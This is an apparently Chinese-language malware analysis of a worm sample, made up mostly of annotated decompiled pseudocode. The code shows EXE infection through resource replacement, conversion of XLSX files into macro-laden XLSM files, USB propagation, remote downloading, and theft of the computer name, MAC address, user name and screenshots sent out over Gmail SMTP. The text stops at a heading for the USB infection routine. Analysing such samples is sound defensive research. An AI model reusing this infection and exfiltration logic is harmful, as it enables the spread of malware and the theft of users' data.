### 一次蠕虫的分析之旅

MD5：

49F4C565C7A09BA7F24EDD9674D29C55



利用EXE文件中的资源数据xlsm感染xlsx文件，并把原先的xlsx文件修改成xlsm后缀

感染exe文件

```c
// 创建线程执行下载文件的操作
int __usercall StartAddress@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>)
{
  int v3; // edx
  int v4; // ecx
  int v5; // edx
  unsigned int v7; // [esp-24h] [ebp-3Ch]
  void *v8; // [esp-20h] [ebp-38h]
  int *v9; // [esp-1Ch] [ebp-34h]
  unsigned int v10; // [esp-18h] [ebp-30h]
  void *v11; // [esp-14h] [ebp-2Ch]
  int *v12; // [esp-10h] [ebp-28h]
  int v13; // [esp-Ch] [ebp-24h]
  int v14; // [esp-8h] [ebp-20h]
  int v15; // [esp-4h] [ebp-1Ch]
  int v16; // [esp+0h] [ebp-18h]
  int v17; // [esp+4h] [ebp-14h]
  int v18; // [esp+8h] [ebp-10h]
  int v19; // [esp+Ch] [ebp-Ch]
  int v20; // [esp+10h] [ebp-8h]
  int v21; // [esp+14h] [ebp-4h]
  int savedregs; // [esp+18h] [ebp+0h]

  v19 = 0;
  v18 = 0;
  v17 = 0;
  v16 = 0;
  v15 = a1;
  v14 = a3;
  v13 = a2;
  v12 = &savedregs;
  v11 = &loc_495B6E;
  v10 = __readfsdword(0);
  __writefsdword(0, (unsigned int)&v10);
  Sleep_0(0x3E8u);
  if ( InternetGetConnectedState_474D34() )     // InternetGetConnectedState判断网络连接状态
  {
    sub_4967D4(*off_49DBDC[0], (int)&str_Server_Connecti[1], v4);// 服务器连接
    v9 = &savedregs;
    v8 = &loc_495A09;
    v7 = __readfsdword(0);
    __writefsdword(0, (unsigned int)&v7);
    if ( unknown_libname_89(&str_afraid_org_api[1], dword_49F118) )
    {
      DownFileByInternetOpenUrlA_474FC0(dword_49F118, (int)&v20);// 下载文件
      LOBYTE(v5) = 124;
      sub_475110(v20, v5, 1, (int)&v21);
      System::__linkproc__ LStrAsg(&dword_49F118, v21);
    }
    (*(void (__fastcall **)(Idstream::TIdStream *, int))(*(_DWORD *)dword_49F114 + 136))(dword_49F114, dword_49F118);
    (*(void (__fastcall **)(Idstream::TIdStream *, int))(*(_DWORD *)dword_49F114 + 140))(dword_49F114, dword_49F124);
    (*(void (__fastcall **)(Idstream::TIdStream *, int))(*(_DWORD *)dword_49F114 + 148))(dword_49F114, dword_49F12C);
    __writefsdword(0, v7);
  }
  else
  {
    LOBYTE(v3) = 1;
    unknown_libname_533(dword_49F134, v3);
  }
  __writefsdword(0, v10);
  v12 = (int *)&loc_495B75;
  return System::__linkproc__ LStrArrayClr(&v16, 6);
}

// 邮件相关操作
// 使用邮件回传用户数据
int __fastcall GetUserInformationByGMail_497290(int a1)
{
  int v1; // ebx
  int v2; // ecx
  int v3; // ST14_4
  int v4; // ST10_4
  int v5; // ST08_4
  int v6; // ecx
  int v7; // eax
  int v8; // ecx
  int v9; // ecx
  int v10; // edx
  int v11; // ecx
  unsigned int v13; // [esp-18h] [ebp-4Ch]
  void *v14; // [esp-14h] [ebp-48h]
  int *v15; // [esp-10h] [ebp-44h]
  unsigned int v16; // [esp-Ch] [ebp-40h]
  void *v17; // [esp-8h] [ebp-3Ch]
  int *v18; // [esp-4h] [ebp-38h]
  int v19; // [esp+Ch] [ebp-28h]
  int v20; // [esp+14h] [ebp-20h]
  int v21; // [esp+18h] [ebp-1Ch]
  int v22; // [esp+1Ch] [ebp-18h]
  int v23; // [esp+20h] [ebp-14h]
  int v24; // [esp+24h] [ebp-10h]
  int v25; // [esp+28h] [ebp-Ch]
  int v26; // [esp+2Ch] [ebp-8h]
  int v27; // [esp+30h] [ebp-4h]
  int savedregs; // [esp+34h] [ebp+0h]

  v1 = a1;
  v18 = &savedregs;
  v17 = &loc_49743D;
  v16 = __readfsdword(0);
  __writefsdword(0, (unsigned int)&v16);
  if ( !*(_DWORD *)(a1 + 768) )
    *(_DWORD *)(a1 + 768) = Adaptreq::TAdapterRequestParamsImpl::TAdapterRequestParamsImpl(
                              dword_49F194,
                              dword_49F190,
                              dword_49F18C);
  if ( InternetGetConnectedState_474D34() )
  {
    v15 = &savedregs;
    v14 = &loc_497418;
    v13 = __readfsdword(0);
    __writefsdword(0, (unsigned int)&v13);
    sub_477050(*(_DWORD *)(v1 + 764), (int)&v27);
    (*(void (__fastcall **)(_DWORD, int *))(**(_DWORD **)(v1 + 780) + 28))(*(_DWORD *)(v1 + 780), &v26);
    System::__linkproc__ LStrCatN(&v27, 6, v2, &str_____________SYS[1], &str___88[1], v26);
    sub_494D10(*(_DWORD *)(v1 + 768), (int)&str_smtp_gmail_com[1], (int)&str_465[1], dword_49F198, dword_49F19C);// smtp.gmail.com
    v3 = v27;
    v4 = dword_49F1A0;
    GetComputerNameA_472E18((int)&v24);         // 获取计算机名
    v5 = v24;
    GetMACAddr_475658((int)&v23);               // 获取计算的MAC地址
    System::__linkproc__ LStrCatN(&v25, 4, v6, v5, &str____[1], v23);
    GetUserNameA_472E58((int)&v22);             // 获取用户名
    v7 = *(_DWORD *)(v1 + 768);
    Dbxtrace::TDBXTracePascalFormatter::GetProperty(v4, v3);
    GetTempPathA_4737B0();
    sub_472D44(8, &v19);
    System::__linkproc__ LStrCatN(&v20, 4, v8, &str___89[1], v19, &str__jpg[1]);
    GetScreen_4752EC(v20, (int)&v21, v9);       // 获取截屏
    sub_494F84(*(_DWORD *)(v1 + 768), v21, 1);
    CreateThreadMail_49546C(*(_DWORD *)(v1 + 768), v10, v11);// 创建线程用于mail回传数据
    __writefsdword(0, v13);
  }
  __writefsdword(0, v16);
  v18 = (int *)&loc_497444;
  return System::__linkproc__ LStrArrayClr(&v19, 10);
}

CODE:00495440 _str_Mail_Sending___ dd 0FFFFFFFFh           ; _top
CODE:00495440                                         ; DATA XREF: sub_495258+4B↑o
CODE:00495440                 dd 15                   ; Len
CODE:00495440                 db 'Mail Sending...',0  ; Text
CODE:00495458 _str_Mail_Sended dd 0FFFFFFFFh           ; _top
CODE:00495458                                         ; DATA XREF: sub_495258+108↑o
CODE:00495458                 dd 11                   ; Len
CODE:00495458                 db 'Mail Sended',0      ; Text

int __stdcall MailHandle_495258()
{
  int v0; // eax
  int v1; // ecx
  int v2; // eax
  int v3; // ecx
  int v4; // eax
  unsigned int v6; // [esp-18h] [ebp-34h]
  void *v7; // [esp-14h] [ebp-30h]
  int *v8; // [esp-10h] [ebp-2Ch]
  unsigned int v9; // [esp-Ch] [ebp-28h]
  void *v10; // [esp-8h] [ebp-24h]
  int *v11; // [esp-4h] [ebp-20h]
  int v12; // [esp+Ch] [ebp-10h]
  int System::AnsiString; // [esp+10h] [ebp-Ch]
  int v14; // [esp+14h] [ebp-8h]
  int v15; // [esp+18h] [ebp-4h]
  int savedregs; // [esp+1Ch] [ebp+0h]

  v12 = 0;
  System::AnsiString = 0;
  v11 = &savedregs;
  v10 = &loc_495430;
  v9 = __readfsdword(0);
  __writefsdword(0, (unsigned int)&v9);
  Sleep_0(0x3A98u);
  v0 = ((int (*)(void))sub_494FCC)();
  if ( !(_BYTE)v0 )
    v0 = sub_495084();
  if ( (unsigned __int8)sub_494FCC(v0) )
  {
    sub_4967D4(*off_49DBDC[0], (int)&str_Mail_Sending___[1], v1);// 邮件操作
    v2 = unknown_libname_100(dword_49F108);
    if ( v2 >= 0 )
    {
      v14 = v2 + 1;
      v15 = 0;
      while ( 1 )
      {
        v8 = &savedregs;
        v7 = &loc_495388;
        v6 = __readfsdword(0);
        __writefsdword(0, (unsigned int)&v6);
        if ( (*(unsigned __int8 (**)(void))(*(_DWORD *)dword_49F0E8 + 84))() )
          (*(void (**)(void))(*(_DWORD *)dword_49F0E8 + 88))();
        System::__linkproc__ LStrAsg((char *)dword_49F0E8 + 224, *(_DWORD *)(dword_49F108 + 4 * v15));
        System::__linkproc__ LStrAsg((char *)dword_49F0E8 + 216, *(_DWORD *)(dword_49F10C + 4 * v15));
        (*(void (__fastcall **)(Idsmtp::TIdSMTP *, signed int))(*(_DWORD *)dword_49F0E8 + 148))(dword_49F0E8, 7000);
        if ( (*(unsigned __int8 (**)(void))(*(_DWORD *)dword_49F0E8 + 84))() )
          break;
        __writefsdword(0, v6);
        ++v15;
        if ( !--v14 )
          goto LABEL_11;
      }
      (*(void (__fastcall **)(Idsmtp::TIdSMTP *, int))(*(_DWORD *)dword_49F0E8 + 188))(dword_49F0E8, dword_49F0EC);
      sub_4967D4(*off_49DBDC[0], (int)&str_Mail_Sended[1], v3);
      (*(void (**)(void))(*(_DWORD *)dword_49F0E8 + 88))();
      __writefsdword(0, v6);
    }
  }
LABEL_11:
  if ( dword_49F104 && (*(int (**)(void))(*(_DWORD *)dword_49F104 + 20))() > 0 )
  {
    v4 = (*(int (**)(void))(*(_DWORD *)dword_49F104 + 20))() - 1;
    if ( v4 >= 0 )
    {
      v14 = v4 + 1;
      v15 = 0;
      do
      {
        (*(void (__fastcall **)(int, int, int *))(*(_DWORD *)dword_49F104 + 12))(dword_49F104, v15, &System::AnsiString);
        if ( (unsigned __int8)Sysutils::FileExists(System::AnsiString) )
        {
          (*(void (__fastcall **)(int, int, int *))(*(_DWORD *)dword_49F104 + 12))(dword_49F104, v15, &v12);
          Sysutils::DeleteFile(v12);
        }
        ++v15;
        --v14;
      }
      while ( v14 );
    }
    (*(void (**)(void))(*(_DWORD *)dword_49F104 + 68))();
  }
  __writefsdword(0, v9);
  v11 = (int *)&loc_495437;
  return System::__linkproc__ LStrArrayClr(&v12, 2);
}

/*
为确保执行的高效与隐蔽，“Synaptics“仅会感染以下三个目录中的 EXE 与 XLSX 文件：
文档目录："C:\Users\UserName\Documents"
桌面目录："C:\Users\UserName\Desktop"
下载目录："C:\Users\UserName\Downloads"
*/


int __fastcall injectingFile_4776D4(int a1, int a2, signed __int32 a3, int a4, char a5)
{
  int v5; // edx
  int v6; // ecx
  int v7; // eax
  const CHAR *strExeName; // eax
  int v9; // ecx
  signed __int32 v10; // ecx
  signed __int32 v11; // ecx
  unsigned int v13; // [esp-14h] [ebp-60h]
  void *v14; // [esp-10h] [ebp-5Ch]
  int *v15; // [esp-Ch] [ebp-58h]
  void *v16; // [esp-8h] [ebp-54h]
  int *v17; // [esp-4h] [ebp-50h]
  void *v18; // [esp+0h] [ebp-4Ch]
  int v19; // [esp+Ch] [ebp-40h]
  int v20; // [esp+10h] [ebp-3Ch]
  int v21; // [esp+14h] [ebp-38h]
  int v22; // [esp+18h] [ebp-34h]
  int v23; // [esp+1Ch] [ebp-30h]
  int v24; // [esp+20h] [ebp-2Ch]
  int v25; // [esp+24h] [ebp-28h]
  int v26; // [esp+28h] [ebp-24h]
  int v27; // [esp+2Ch] [ebp-20h]
  int v28; // [esp+30h] [ebp-1Ch]
  int System::AnsiString; // [esp+34h] [ebp-18h]
  int v30; // [esp+38h] [ebp-14h]
  int v31; // [esp+3Ch] [ebp-10h]
  const CHAR *v32; // [esp+40h] [ebp-Ch]
  int v33; // [esp+44h] [ebp-8h]
  int v34; // [esp+48h] [ebp-4h]
  int savedregs; // [esp+4Ch] [ebp+0h]

  v32 = (const CHAR *)_InterlockedExchange(&v34, a3);
  v33 = a2;
  v34 = a1;
  System::__linkproc__ LStrAddRef(a2, a2, v32);
  System::__linkproc__ LStrAddRef(v32, v5, v6);
  v17 = &savedregs;
  v16 = &loc_4778DD;
  v15 = (int *)__readfsdword(0);
  __writefsdword(0, (unsigned int)&v15);
  if ( (*(int (__stdcall **)(int *))(*(_DWORD *)v34 + 20))(v15) >= 1 )
  {
    v7 = (*(int (**)(void))(*(_DWORD *)v34 + 20))() - 1;
    if ( v7 >= 0 )
    {
      v30 = v7 + 1;
      v31 = 0;
      do
      {
        (*(void (__fastcall **)(int, int, int *))(*(_DWORD *)v34 + 12))(v34, v31, &System::AnsiString);
        if ( (unsigned __int8)Sysutils::FileExists(System::AnsiString) )
        {
          v15 = &savedregs;
          v14 = &loc_47789F;
          v13 = __readfsdword(0);
          __writefsdword(0, (unsigned int)&v13);
          (*(void (__fastcall **)(int, int, int *))(*(_DWORD *)v34 + 12))(v34, v31, &v28);
          strExeName = (const CHAR *)System::__linkproc__ LStrToPChar(v28);
          hModule_49EC78 = LoadLibraryA(strExeName);
          if ( (unsigned __int8)FindResourceA_4770E4(hModule_49EC78, (int)v32, v9) )// 寻找资源检查是否含有EXEVSNX感染标记
          {
            sub_47717C(hModule_49EC78, v32, (int)&v24);// 加载资源
            if ( Sysutils::StrToInt(v24) >= a4 )// 判断版本
            {
              FreeLibrary_0(hModule_49EC78);
              (*(void (__fastcall **)(int, int, int *))(*(_DWORD *)v34 + 12))(v34, v31, &v19);
              System::__linkproc__ LStrCat3(&v20, &str_Infected_Cancel[1], v19);
              (*(void (__fastcall **)(int, int, int))(*(_DWORD *)v34 + 32))(v34, v31, v20);
            }
            else                                // 版本过低则更新 Vrs Updated
            {
              (*(void (__fastcall **)(int, int, int *))(*(_DWORD *)v34 + 12))(v34, v31, &v23);
              LOBYTE(v11) = a5;
              injectHandle_4774A8(v23, v33, v11, 1);
              (*(void (__fastcall **)(int, int, int *))(*(_DWORD *)v34 + 12))(v34, v31, &v21);
              System::__linkproc__ LStrCat3(&v22, &str_Vrs_Updated____[1], v21);
              (*(void (__fastcall **)(int, int, int))(*(_DWORD *)v34 + 32))(v34, v31, v22);
            }
          }
          else                                  // 没有标记，则进行感染
          {
            FreeLibrary_0(hModule_49EC78);
            (*(void (__fastcall **)(int, int, int *))(*(_DWORD *)v34 + 12))(v34, v31, &v27);
            LOBYTE(v10) = a5;
            injectHandle_4774A8(v27, v33, v10, 0);// 感染主函数
            (*(void (__fastcall **)(int, int, int *))(*(_DWORD *)v34 + 12))(v34, v31, &v25);
            System::__linkproc__ LStrCat3(&v26, &str_Completed____[1], v25);
            (*(void (__fastcall **)(int, int, int))(*(_DWORD *)v34 + 32))(v34, v31, v26);
          }
          __writefsdword(0, v13);
        }
        ++v31;
        --v30;
      }
      while ( v30 );
    }
  }
  __writefsdword(0, (unsigned int)v16);
  v18 = &loc_4778E4;
  System::__linkproc__ LStrArrayClr(&v19, 11);
  return System::__linkproc__ LStrArrayClr(&v32, 2);
}

// 执行感染操作的函数
int __fastcall injectHandle_4774A8(int a1, int a2, signed __int32 a3, char a4)
{
  signed __int32 v4; // ecx
  int v5; // edx
  int v6; // ecx
  int v7; // ST10_4
  int v8; // ecx
  int v9; // ecx
  int v10; // ecx
  int v11; // ecx
  int v12; // ecx
  const CHAR *v13; // ST10_4
  int v14; // ecx
  const CHAR *v15; // eax
  int v16; // ecx
  int v17; // ecx
  int v18; // ecx
  unsigned int v20; // [esp-Ch] [ebp-48h]
  void *v21; // [esp-8h] [ebp-44h]
  int *v22; // [esp-4h] [ebp-40h]
  int v23; // [esp+4h] [ebp-38h]
  int System::AnsiString; // [esp+8h] [ebp-34h]
  int v25; // [esp+Ch] [ebp-30h]
  int v26; // [esp+10h] [ebp-2Ch]
  int v27; // [esp+14h] [ebp-28h]
  int v28; // [esp+18h] [ebp-24h]
  int v29; // [esp+1Ch] [ebp-20h]
  int v30; // [esp+20h] [ebp-1Ch]
  int v31; // [esp+24h] [ebp-18h]
  int v32; // [esp+28h] [ebp-14h]
  int v33; // [esp+2Ch] [ebp-10h]
  const CHAR *v34; // [esp+34h] [ebp-8h]
  int v35; // [esp+38h] [ebp-4h]
  int savedregs; // [esp+3Ch] [ebp+0h]

  v4 = _InterlockedExchange(&v35, a3);
  v34 = (const CHAR *)a2;
  v35 = a1;
  System::__linkproc__ LStrAddRef(a1, a2, v4);
  System::__linkproc__ LStrAddRef(v34, v5, v6);
  v22 = &savedregs;
  v21 = &loc_477699;
  v20 = __readfsdword(0);
  __writefsdword(0, (unsigned int)&v20);
  GetTempPathA_4737B0();                        // 获取系统的临时目录
  sub_472D44(8, &v33);                          // 获取随机名字的文件 
  System::ParamStr(0);
  v7 = v32;
  System::__linkproc__ LStrCatN(&v31, 4, v8, &str___29[1], v33, &str__exe[1]);
  copyFile_473804(v7, v31, 128);                // 把自身复制到临时目录
  if ( a4 )
  {
    System::__linkproc__ LStrCatN(&v29, 4, v9, &str___29[1], v33, &str__exe[1]);
    sub_477370(v29, v34, v11);
  }
  else
  {
    System::__linkproc__ LStrCatN(&v30, 4, v9, &str___29[1], v33, &str__exe[1]);
    sub_477244(v30, v35, (int)v34);             // UpdateResourceA
  }
  System::__linkproc__ LStrCatN(&v28, 4, v10, &str___29[1], v33, &str__ico[1]);
  CreateIconFile_473E4C(v35, v28, 0, 0);        // 创建图标文件
  System::__linkproc__ LStrCatN(&v27, 4, v12, &str___29[1], v33, &str__exe[1]);
  v13 = (const CHAR *)System::__linkproc__ LStrToPChar(v27);
  System::__linkproc__ LStrCatN(&v26, 4, v14, &str___29[1], v33, &str__ico[1]);
  v15 = (const CHAR *)System::__linkproc__ LStrToPChar(v26);
  CreateNewFile_473930(v15, v13);               // 资源段EXERESX中的内容更新到临时文件的PE资源段
  System::__linkproc__ LStrCatN(&v25, 4, v16, &str___29[1], v33, &str__exe[1]);
  copyFile_473804(v25, v35, 128);               // copyFile用临时文件替换原执行文件
  System::__linkproc__ LStrCatN(&System::AnsiString, 4, v17, &str___29[1], v33, &str__exe[1]);
  Sysutils::DeleteFile(System::AnsiString);
  System::__linkproc__ LStrCatN(&v23, 4, v18, &str___29[1], v33, &str__ico[1]);
  Sysutils::DeleteFile(v23);                    // 删除文件
  __writefsdword(0, v20);
  v22 = (int *)&loc_4776A0;
  return System::__linkproc__ LStrArrayClr(&v23, 14);
}

// 还会向xlsx文件 感染后是xlsm文件中写恶意宏代码
int __fastcall GetXlsmData_478EE4(int a1, int a2, int a3)
{
  Variants::TCustomVariantType **v3; // ecx
  int v4; // ecx
  int v5; // ecx
  int v6; // ST10_4
  unsigned int v7; // ST18_4
  int v8; // ST18_4
  int v9; // ST24_4
  int v10; // ebx
  int v11; // ST18_4
  int v12; // ST14_4
  int v13; // ST20_4
  int v14; // ST24_4
  int v15; // ST20_4
  int v16; // ST24_4
  int v17; // ST24_4
  unsigned __int8 v18; // zf
  char v19; // sf
  char v20; // of
  int v21; // ST24_4
  int v22; // ST18_4
  int v23; // ST14_4
  int v24; // ST24_4
  int v25; // ebx
  signed int v26; // esi
  int result; // eax
  unsigned int v28; // [esp-18h] [ebp-22Ch]
  void *v29; // [esp-14h] [ebp-228h]
  int *v30; // [esp-10h] [ebp-224h]
  unsigned int v31; // [esp-Ch] [ebp-220h]
  void *v32; // [esp-8h] [ebp-21Ch]
  int *v33; // [esp-4h] [ebp-218h]
  char v34; // [esp+8h] [ebp-20Ch]
  int v35; // [esp+18h] [ebp-1FCh]
  void *v36; // [esp+1Ch] [ebp-1F8h]
  int v37; // [esp+20h] [ebp-1F4h]
  int v38; // [esp+24h] [ebp-1F0h]
  char v39; // [esp+28h] [ebp-1ECh]
  char v40; // [esp+38h] [ebp-1DCh]
  char v41; // [esp+48h] [ebp-1CCh]
  VARIANTARG v42; // [esp+58h] [ebp-1BCh]
  char v43; // [esp+68h] [ebp-1ACh]
  char v44; // [esp+78h] [ebp-19Ch]
  char v45; // [esp+88h] [ebp-18Ch]
  char v46; // [esp+98h] [ebp-17Ch]
  int v47; // [esp+A8h] [ebp-16Ch]
  int v48; // [esp+B8h] [ebp-15Ch]
  VARIANTARG v49; // [esp+C8h] [ebp-14Ch]
  char v50; // [esp+D8h] [ebp-13Ch]
  char v51; // [esp+E8h] [ebp-12Ch]
  char v52; // [esp+F8h] [ebp-11Ch]
  char v53; // [esp+108h] [ebp-10Ch]
  char v54; // [esp+118h] [ebp-FCh]
  int v55; // [esp+128h] [ebp-ECh]
  char v56; // [esp+138h] [ebp-DCh]
  char v57; // [esp+148h] [ebp-CCh]
  char v58; // [esp+158h] [ebp-BCh]
  char v59; // [esp+168h] [ebp-ACh]
  char v60; // [esp+178h] [ebp-9Ch]
  int v61; // [esp+188h] [ebp-8Ch]
  char v62; // [esp+198h] [ebp-7Ch]
  char v63; // [esp+1A8h] [ebp-6Ch]
  char v64; // [esp+1B8h] [ebp-5Ch]
  char v65; // [esp+1C8h] [ebp-4Ch]
  char v66; // [esp+1D8h] [ebp-3Ch]
  int v67; // [esp+1E8h] [ebp-2Ch]
  int v68; // [esp+1F0h] [ebp-24h]
  VARIANTARG pvarg; // [esp+1F4h] [ebp-20h]
  int System::AnsiString; // [esp+208h] [ebp-Ch]
  char v71; // [esp+20Fh] [ebp-5h]
  int v72; // [esp+210h] [ebp-4h]
  int savedregs; // [esp+214h] [ebp+0h]

  v71 = a2;
  v72 = a1;
  System::__linkproc__ LStrAddRef(a1, a2, a3);
  v33 = &savedregs;
  v32 = &loc_4795C3;
  v31 = __readfsdword(0);
  __writefsdword(0, (unsigned int)&v31);
  if ( v71 )
  {
    Comobj::CreateOleObject((const int)&str_Excel_Applicati_0[1]);
    Variants::__linkproc__ VarFromDisp(&pvarg);
    Variants::__linkproc__ DispInvoke(0, &pvarg, dword_4795EC, 0);
    Variants::__linkproc__ DispInvoke(0, &pvarg, dword_479600, 0);
    Variants::__linkproc__ DispInvoke(0, &pvarg, dword_479614, 0);
  }
  else
  {
    Variants::__linkproc__ VarCopy((int)&pvarg, &pvargSrc, v3);
    System::__linkproc__ LStrLAsg(&System::AnsiString, dword_49ECA8);
  }
  if ( !(unsigned __int8)Sysutils::FileExists(System::AnsiString) )
  {
    v30 = &savedregs;
    v29 = &loc_47903A;
    v28 = __readfsdword(0);
    __writefsdword(0, (unsigned int)&v28);
    GetTempPathA_4737B0();                      // 获取系统临时目录
    sub_472D44(8, &v67);
    System::__linkproc__ LStrCatN(&System::AnsiString, 4, v4, dword_479628, v67, ".xlsm");
    sub_47518C((const CHAR *)&str_XLSM[1], System::AnsiString, v5);// 读取资源模块xlsm的数据
    System::__linkproc__ LStrAsg(&dword_49ECA8, System::AnsiString);
    Variants::__linkproc__ DispInvoke((VARIANTARG *)&v66, &pvarg, dword_479658, dword_47964C);
    Variants::__linkproc__ DispInvoke(0, &v66, v6, &System::AnsiString);
    __writefsdword(0, v7);
    System::TObject::Free(dword_49ECAC);
  }
  if ( (unsigned __int8)sub_474CD0(&str_Excel_Applicati_0[1]) )
  {
    v30 = &savedregs;
    v29 = &loc_47954D;
    v28 = __readfsdword(0);
    __writefsdword(0, (unsigned int)&v28);
    Variants::__linkproc__ DispInvoke((VARIANTARG *)&v65, &pvarg, dword_479658, dword_479668);
    Variants::__linkproc__ DispInvoke(0, &v65, v8, &v72);
    Variants::__linkproc__ DispInvoke((VARIANTARG *)&v62, &pvarg, dword_479690, 1);
    Variants::__linkproc__ DispInvoke((VARIANTARG *)&v63, &v62, dword_479680, dword_479674);
    Variants::__linkproc__ DispInvoke((VARIANTARG *)&v64, &v63, v9, v28);
    v10 = Variants::__linkproc__ VarToInteger(&v64);
    Variants::__linkproc__ DispInvoke((VARIANTARG *)&v60, &pvarg, dword_479690, 1);
    Variants::__linkproc__ DispInvoke((VARIANTARG *)&v61, &v60, dword_4796A0, 1);
    v11 = v61;
    Variants::__linkproc__ DispInvoke((VARIANTARG *)&v58, &pvarg, dword_479690, 2);
    Variants::__linkproc__ DispInvoke((VARIANTARG *)&v59, &v58, dword_479680, &dword_4796B0);
    Variants::__linkproc__ DispInvoke(0, &v59, v12, v11);
    Variants::__linkproc__ DispInvoke((VARIANTARG *)&v57, &pvarg, dword_479690, 2);
    Variants::__linkproc__ DispInvoke(0, &v57, dword_4796BC, v28);
    if ( v10 > 0 )
    {
      do
      {
        Variants::__linkproc__ DispInvoke((VARIANTARG *)&v54, &pvarg, dword_479680, dword_479674);
        Variants::__linkproc__ DispInvoke((VARIANTARG *)&v55, &v54, v13, byte_4796C8);
        Variants::__linkproc__ DispInvoke((VARIANTARG *)&v56, &pvarg, (char *)&loc_4796D3 + 1, v55);
        Variants::__linkproc__ DispInvoke(0, &v56, v14, v28);
        Variants::__linkproc__ DispInvoke((VARIANTARG *)&v52, &pvarg, dword_479704, dword_4796F0);
        Variants::__linkproc__ DispInvoke((VARIANTARG *)&v53, &v52, v15, dword_4796E4);
        Variants::__linkproc__ DispInvoke(0, &v53, v16, v28);
        --v10;
      }
      while ( v10 );
    }
    Variants::__linkproc__ DispInvoke((VARIANTARG *)&v50, &pvarg, dword_479680, dword_479674);
    Variants::__linkproc__ DispInvoke((VARIANTARG *)&v51, &v50, v17, v28);
    Variants::__linkproc__ VarFromInt(&v49);
    Variants::__linkproc__ VarCmpLE(&v51, &v49);
    if ( (unsigned __int8)(v19 ^ v20) | v18 )
    {
      Variants::__linkproc__ DispInvoke((VARIANTARG *)&v46, &pvarg, dword_479680, dword_479674);
      Variants::__linkproc__ DispInvoke((VARIANTARG *)&v47, &v46, v21, v28);
      Variants::__linkproc__ DispInvoke((VARIANTARG *)&v48, &pvarg, (char *)&loc_4796D3 + 1, v47);
      v22 = v48;
      Variants::__linkproc__ DispInvoke((VARIANTARG *)&v45, &pvarg, dword_479680, dword_479714);
      Variants::__linkproc__ DispInvoke(0, &v45, v23, v22);
    }
    Variants::__linkproc__ DispInvoke((VARIANTARG *)&v43, &pvarg, dword_479680, dword_479674);
    Variants::__linkproc__ DispInvoke((VARIANTARG *)&v44, &v43, v24, v28);
    Variants::__linkproc__ VarFromInt(&v42);
    unknown_libname_276(&v44, &v42);
    v25 = Variants::__linkproc__ VarToInteger(&v44);
    if ( v25 > 0 )
    {
      v26 = 1;
      do
      {
        Variants::__linkproc__ DispInvoke((VARIANTARG *)&v40, &pvarg, dword_479690, 1);
        Variants::__linkproc__ DispInvoke((VARIANTARG *)&v41, &v40, dword_4796A0, v26);
        Variants::__linkproc__ DispInvoke(0, &v41, dword_479614, 0);
        ++v26;
        --v25;
      }
      while ( v25 );
    }
    Variants::__linkproc__ DispInvoke((VARIANTARG *)&v39, &pvarg, dword_479690, 1);
    Variants::__linkproc__ DispInvoke(0, &v39, byte_479724, v28);
    __writefsdword(0, v28);
    v30 = (int *)&loc_479557;
    Sysutils::DeleteFile(v72);
    Sysutils::ChangeFileExt(v72, ".xlsm", &v38);// 修改文件的后缀为xlsm
    copyFile_473804(System::AnsiString, v38, 128);
    Sysutils::ExtractFileDir(v72);
    System::__linkproc__ LStrCat(&v37, "\\~$cache1");
    result = Sysutils::FileExists(v37);
    if ( !(_BYTE)result )
    {
      Sysutils::ExtractFileDir(v72);
      System::__linkproc__ LStrCat(&v36, "\\~$cache1");
      v29 = v36;
      System::ParamStr(0);
      result = copyFile_473804(v35, (int)v29, 6);
    }
    if ( v71 )
    {
      Variants::__linkproc__ DispInvoke(0, &pvarg, &dword_479740, v30);
      Varhlpr::VariantClear(&v34);
      result = Variants::__linkproc__ OleVarFromVar(&pvarg, &v34);
    }
  }
  else
  {
    __writefsdword(0, v31);
    v33 = (int *)&loc_4795CA;
    sub_4109FC();
    System::__linkproc__ LStrArrayClr(&v35, 4);
    System::__linkproc__ FinalizeArray(&v39, &byte_4010B4, 28, v33);
    System::__linkproc__ LStrArrayClr(&v67, 2);
    System::__linkproc__ IntfClear(&v68);
    sub_4109FC();
    System::__linkproc__ LStrClr(&System::AnsiString);
    result = System::__linkproc__ LStrClr(&v72);
  }
  return result;
}

// 感染USB设备中的exe和xlsx文件
int __userpurge injectUsb_497080@<eax>(int a1@<eax>, int a2@<edx>, int System::AnsiString@<ecx>, int a4@<ebx>, int a5@<edi>, int a6@<esi>, int a7)
{
  int v7; // esi
  int v8; // ebx
  int v9; // ecx
  char v10; // ST08_1
  char v11; // ST04_1
  int v12; // ST00_4
  signed __int32 v13; // eax
  char v14; // ST08_1
  unsigned int v16; // [esp-24h] [ebp-34h]
  void *v17; // [esp-20h] [ebp-30h]
  int *v18; // [esp-1Ch] [ebp-2Ch]
  unsigned int v19; // [esp-18h] [ebp-28h]
  void *v20; // [esp-14h] [ebp-24h]
  int *v21; // [esp-10h] [ebp-20h]
  int v22; // [esp-Ch] [ebp-1Ch]
  int v23; // [esp-8h] [ebp-18h]
  int v24; // [esp-4h] [ebp-14h]
  int v25; // [esp+0h] [ebp-10h]
  int v26; // [esp+4h] [ebp-Ch]
  int v27; // [esp+8h] [ebp-8h]
  int v28; // [esp+Ch] [ebp-4h]
  int savedregs; // [esp+10h] [ebp+0h]

  v28 = 0;
  v27 = 0;
  v26 = 0;
  v25 = 0;
  v24 = a4;
  v23 = a6;
  v22 = a5;
  v7 = System::AnsiString;
  v8 = a1;
  v21 = &savedregs;
  v20 = &loc_497174;
  v19 = __readfsdword(0);
  __writefsdword(0, (unsigned int)&v19);
  v18 = &savedregs;
  v17 = &loc_49714F;
  v16 = __readfsdword(0);
  __writefsdword(0, (unsigned int)&v16);
  Sysutils::ExtractFileDrive(System::AnsiString, (int)&v27);// 获得额外的驱动器
  System::__linkproc__ LStrCat3(&v28, &str_Drive_Added____[1], v27);// Drive Added
  sub_4967D4(v8, v28, v9);
  v10 = Sysutils::StrToBool(dword_49F1D0);
  v11 = Sysutils::StrToBool(dword_49F1D4);
  Sysutils::ExtractFileDrive(v7, (int)&v26);
  System::__linkproc__ LStrCat(&v26, &str___86[1]);
  v12 = v26;
  v13 = Sysutils::StrToBool(dword_49F1CC);
  injectingUsb_4975D8(v8, v12, v13, a5, v11, v10);
  v14 = Sysutils::StrToBool(dword_49F1B8);
  Sysutils::ExtractFileDrive(v7, (int)&v25);
  System::__linkproc__ LStrCat(&v25, &str___86[1]);
  sub_496A40(v14);
  __writefsdword(0, v16);
  __writefsdword(0, v19);
  v21 = (int *)&loc_49717B;
  return System::__linkproc__ LStrArrayClr(&v25, 4);
}

// 执行USB感染的函数
